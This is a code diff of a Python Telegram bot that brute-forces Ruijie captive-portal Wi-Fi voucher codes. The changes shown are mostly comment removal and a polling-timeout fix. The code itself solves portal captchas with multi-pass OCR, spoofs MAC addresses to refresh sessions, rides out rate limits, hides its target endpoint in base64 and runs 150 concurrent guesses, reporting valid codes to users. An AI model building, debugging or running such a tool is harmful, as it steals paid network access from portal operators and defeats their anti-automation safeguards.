@@ -1,7 +1,7 @@
 # ═══════════════════════════════════════════════════════════════════════════
 #  VOUCHER BOT — Ruijie 2026 System Update Support
 #  Admin: 1626617395
-#  Features: Captcha retry, session refresh, rate-limit handling
+#  Fixed: Polling TimeoutError + Captcha-aware retry
 # ═══════════════════════════════════════════════════════════════════════════
 import asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
 import logging
@@ -61,7 +61,6 @@ SUCCESS_CODE = asyncio.Queue()
 session    = None
 _connector = None
 
-# ── 2026 UPDATE: Reduced concurrency due to aggressive captcha enforcement ──
 CONCURRENCY  = 150
 _voucher_sem = None
 _start_time  = time.monotonic()
@@ -71,10 +70,8 @@ active_scans_count   = 0
 active_scans_lock    = asyncio.Lock()
 
 BATCH_SIZE = 150
-
-# ── 2026 UPDATE: Captcha retry count increased (Ruijie captcha is harder) ──
 CAPTCHA_MAX_RETRIES = 15
-CAPTCHA_RATE_LIMIT_COOLDOWN = 3  # seconds
+CAPTCHA_RATE_LIMIT_COOLDOWN = 3
 
 BRUTE_MODES = {
     "1": {"name": "ဂဏန်းသီးသန့် (0-9)",         "charset": string.digits},
@@ -288,20 +285,15 @@ def is_safe_url(url: str) -> bool:
     except Exception:
         return False
 
-# ─── CAPTCHA (2026 Update) ──────────────────────────────────────────────
+# ─── CAPTCHA ────────────────────────────────────────────────────────────
 _ocr = ddddocr.DdddOcr(show_ad=False)
 
 def _ocr_sync(image_bytes):
-    """Enhanced OCR with multiple preprocessing passes for higher accuracy."""
     nparr = np.frombuffer(image_bytes, np.uint8)
     img   = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
     if img is None:
         return None
-
-    # Try multiple preprocessing methods and pick the longest result
     results = []
-
-    # Method 1: Standard grayscale + Otsu
     try:
         gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
         blur = cv2.GaussianBlur(gray, (3, 3), 0)
@@ -311,8 +303,6 @@ def _ocr_sync(image_bytes):
         if r: results.append(r)
     except Exception:
         pass
-
-    # Method 2: Adaptive threshold
     try:
         gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
         th = cv2.adaptiveThreshold(gray, 255, cv2.ADAPTIVE_THRESH_GAUSSIAN_C,
@@ -322,19 +312,14 @@ def _ocr_sync(image_bytes):
         if r: results.append(r)
     except Exception:
         pass
-
-    # Method 3: No preprocessing (raw)
     try:
         _, buf = cv2.imencode(".png", img)
         r = _ocr.classification(buf.tobytes()).upper()
         if r: results.append(r)
     except Exception:
         pass
-
     if not results:
         return None
-
-    # Return the most common or longest result
     results.sort(key=len, reverse=True)
     return results[0]
 
@@ -350,7 +335,6 @@ def replace_mac(url, new_mac):
     return re.sub(r"(?<=mac=)[^&]+", new_mac, url)
 
 async def get_session_id(sess, session_url, prev=None):
-    """Fetch a fresh sessionId. 2026: follow all redirects, look everywhere."""
     url = replace_mac(session_url, get_mac())
     headers = {
         "accept": "text/html,application/xhtml+xml,*/*;q=0.8",
@@ -359,11 +343,9 @@ async def get_session_id(sess, session_url, prev=None):
     try:
         async with sess.get(url, headers=headers, allow_redirects=True,
                             timeout=aiohttp.ClientTimeout(total=15)) as req:
-            # Check final URL
             m = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
             if m:
                 return m.group(1)
-            # Check redirect history
             for h in req.history:
                 m = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(h.url))
                 if m:
@@ -372,7 +354,6 @@ async def get_session_id(sess, session_url, prev=None):
                 m = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", loc)
                 if m:
                     return m.group(1)
-            # Check body
             try:
                 body = await req.text()
                 m = re.search(r'sessionId["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]+)', body)
@@ -420,10 +401,8 @@ async def check_session_url(session_url):
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     }
     try:
-        # Direct check first
         if "sessionId" in session_url:
             return True
-
         async with session.get(session_url, allow_redirects=True, headers=headers,
                                timeout=aiohttp.ClientTimeout(total=20)) as resp:
             if "sessionId" in str(resp.url):
@@ -445,7 +424,7 @@ async def check_session_url(session_url):
         logger.error(f"check_session_url: {e}")
         return False
 
-# ─── Core voucher check (2026 Captcha-aware) ────────────────────────────
+# ─── Core voucher check ──────────────────────────────────────────────────
 POST_URL = base64.b64decode(
     b"aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM="
 ).decode()
@@ -469,7 +448,6 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False)
             if not session_id:
                 continue
 
-            # ── 2026 UPDATE: 15 captcha retries with multi-pass OCR ──
             auth_code = None
             for cap_attempt in range(CAPTCHA_MAX_RETRIES):
                 try:
@@ -478,18 +456,16 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False)
                     if text and await Varify_Captcha(ts, session_id, text):
                         auth_code = text
                         break
-                    # If captcha fails repeatedly, refresh session
                     if cap_attempt == CAPTCHA_MAX_RETRIES // 2:
                         new_sid = await get_session_id(ts, session_url, session_id)
                         if new_sid and new_sid != session_id:
                             session_id = new_sid
-                            logger.debug(f"Session refreshed after captcha failures")
+                            logger.debug("Session refreshed after captcha failures")
                 except Exception:
                     continue
 
             if not auth_code:
                 logger.warning(f"Captcha failed ({CAPTCHA_MAX_RETRIES} tries) for code={code}")
-                # Refresh session and skip this code
                 new_sid = await get_session_id(ts, session_url, session_id)
                 if new_sid:
                     session_id = new_sid
@@ -519,9 +495,8 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False)
                 logger.debug(f"perform_check post: {e}")
                 return None
 
-        # ── 2026 UPDATE: request limited → captcha retry with fresh session ──
         if response and "request limited" in response:
-            logger.warning(f"Rate limited on code={code}, refreshing session + captcha ({attempt+1}/3)")
+            logger.warning(f"Rate limited on code={code}, refreshing ({attempt+1}/3)")
             await asyncio.sleep(CAPTCHA_RATE_LIMIT_COOLDOWN)
             continue
         break
@@ -529,11 +504,9 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False)
     if not response:
         return None
 
-    # ── SUCCESS ──
     if "logonUrl" in response:
         if recheck:
             return code
-
         plan_str = "N/A"
         try:
             res_data  = json.loads(response)
@@ -545,14 +518,11 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False)
                 plan_str = fetched
         except Exception:
             pass
-
         entry = {"code": code, "session_id": session_id, "plan": plan_str}
-
         existing = success_texts.setdefault(chat_id, [])
         if code not in {e["code"] for e in existing}:
             existing.append(entry)
             await SUCCESS_CODE.put({"chat_id": chat_id, "entry": entry})
-
         if notify_setting.get(chat_id, True):
             code_line = "\n".join([f"`{i['code']}` – {i.get('plan', 'N/A')}"
                                    for i in success_texts[chat_id]])
@@ -569,12 +539,10 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False)
                 pass
         return code
 
-    # ── LIMITED ──
     elif "STA" in response:
         limited_texts.setdefault(chat_id, [])
         if code not in limited_texts[chat_id]:
             limited_texts[chat_id].append(code)
-
         if notify_setting.get(chat_id, True):
             limited_line = "\n".join(limited_texts[chat_id][-20:])
             text = f"⚠️ Limited Codes ({len(limited_texts[chat_id])}):\n{limited_line}"
@@ -660,7 +628,7 @@ async def run_bruteforce(mode, length, chat_id, session_url, scan_id,
         async with active_scans_lock:
             active_scans_count = max(0, active_scans_count - 1)
 
-# ─── Keyboards (same as before) ────────────────────────────────────────
+# ─── Keyboards ──────────────────────────────────────────────────────────
 def kb_main():
     kb = InlineKeyboardMarkup(row_width=2)
     kb.add(
@@ -1104,8 +1072,11 @@ async def cb_handler(call):
         except Exception:
             pass
 
-# ─── Polling ───────────────────────────────────────────────────────────
+# ─── Polling (FIXED — TimeoutError spam resolved) ──────────────────────
 async def start_polling():
+    # Suppress telebot's noisy timeout logs (they're non-fatal)
+    logging.getLogger("TeleBot").setLevel(logging.CRITICAL)
+
     try:
         me = await bot.get_me()
         logger.info(f"🤖 Bot identity: @{me.username} (id={me.id})")
@@ -1121,9 +1092,18 @@ async def start_polling():
     backoff = 5
     while True:
         try:
-            await bot.infinity_polling(timeout=45, request_timeout=55, interval=0)
+            # timeout=30 (Telegram hold), request_timeout=90 (aiohttp) → 60s buffer
+            await bot.infinity_polling(
+                timeout=30,
+                request_timeout=90,
+                long_polling_timeout=30,
+                interval=0,
+            )
             return
-        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
+        except asyncio.TimeoutError:
+            # Normal long-poll rotation — NOT an error
+            continue
+        except aiohttp.ClientError as e:
             logger.warning(f"Polling connection error: {e}. Retry in {backoff}s")
             await asyncio.sleep(backoff)
             backoff = min(backoff * 2, 60)
